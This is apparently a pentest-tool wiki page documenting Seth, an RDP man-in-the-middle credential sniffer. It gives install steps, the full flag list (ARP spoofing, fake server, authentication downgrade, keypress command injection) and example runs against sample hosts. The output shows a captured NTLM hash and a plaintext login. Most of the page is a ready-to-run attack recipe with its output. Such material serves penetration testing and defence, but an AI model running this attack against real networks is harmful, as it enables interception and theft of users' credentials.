---
title : "Seth"
# pre : ' '
description : "RDP credential sniffer - Man in the Middle RDP"
date : 2020-12-01T08:18:42+01:00
# hidden : true
# draft : true
weight : 0
# tags : ['']
---

## Seth

RDP credential sniffer - Man in the Middle RDP

## Installation

Requirements:

```plain
sudo apt install dsniff tcpdump
```

```plain
git clone https://github.com/SySS-Research/Seth.git
```

## Usage

```plain
seth.py [-h] [-d] [-f] [-p LISTEN_PORT] [-b BIND_IP] [-g {0,1,3,11}]
               [-j INJECT] -c CERTFILE -k KEYFILE
               target_host [target_port]
```

## Flags

```plain
RDP credential sniffer -- Adrian Vollmer, SySS GmbH 2017

positional arguments:
  target_host           target host of the RDP service
  target_port           TCP port of the target RDP service (default 3389)

optional arguments:
  -h, --help            show this help message and exit
  -d, --debug           show debug information
  -f, --fake-server     perform a 'fake server' attack
  -p LISTEN_PORT, --listen-port LISTEN_PORT
                        TCP port to listen on (default 3389)
  -b BIND_IP, --bind-ip BIND_IP
                        IP address to bind the fake service to (default all)
  -g {0,1,3,11}, --downgrade {0,1,3,11}
                        downgrade the authentication protocol to this (default
                        3)
  -j INJECT, --inject INJECT
                        command to execute via key press event injection
  -c CERTFILE, --certfile CERTFILE
                        path to the certificate file
  -k KEYFILE, --keyfile KEYFILE
                        path to the key file
```

## Examples

### Start MiTM attack

| Attacker IP | IP to ARP spoof for | Target RDP to connect to |
| :-: | :-: | :-: |
10.10.10.10 | 10.10.10.15 | 10.10.10.20

```plain
./seth.sh eth0 10.10.10.{10,15,20}
```

```plain
$ sudo ./seth.sh eth0 10.10.10.{10,15,20}
███████╗███████╗████████╗██╗  ██╗
██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017
███████║███████╗   ██║   ██║  ██║   https://www.syss.de
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
[*] Linux OS detected, using iptables as the netfilter interpreter
[*] Spoofing arp replies...
[*] Turning on IP forwarding...
[*] Set iptables rules for SYN packets...
[*] Waiting for a SYN packet to the original destination...
[...]
[*] Cleaning up...
[*] Done
```

### Capture of plaintext credentials

```plain
sudo ./seth.sh enp0s31f6 10.10.10.5 10.10.10.7 10.10.10.10
[*] Linux OS detected, using iptables as the netfilter interpreter
[*] Spoofing arp replies...
[*] Turning on IP forwarding...
[*] Set iptables rules for SYN packets...
[*] Waiting for a SYN packet to the original destination...
[+] Got it! Original destination is 10.10.10.10
[*] Clone the x509 certificate of the original destination...
[*] Adjust iptables rules for all packets...
[*] Run RDP proxy...
Listening for new connection
Connection received from 10.10.10.7:53063
Warning: RC4 not available on client, attack might not work
Downgrading authentication options from 11 to 3
Listening for new connection
Enable SSL
johndo@example.com:::7c70ee2cd148b341:ee85ef730780002e00370030000000000000000000
Tamper with NTLM response
Downgrading CredSSP
Connection lost ([Errno 104] Connection reset by peer)
[...REDACTED...]
Connection received from 10.10.10.7:53067
Warning: RC4 not available on client, attack might not work
Enable SSL
Listening for new connection
'NoneType' object has no attribute 'getsockopt'
Hiding forged protocol request from client
.\johndo@example.com:Welkom1234
[*] Cleaning up...
[*] Done
```

### Example capture of hashes

![Example](images/example.png)

## URL List

- [GitHub.com - Seth](https://github.com/SySS-Research/Seth)
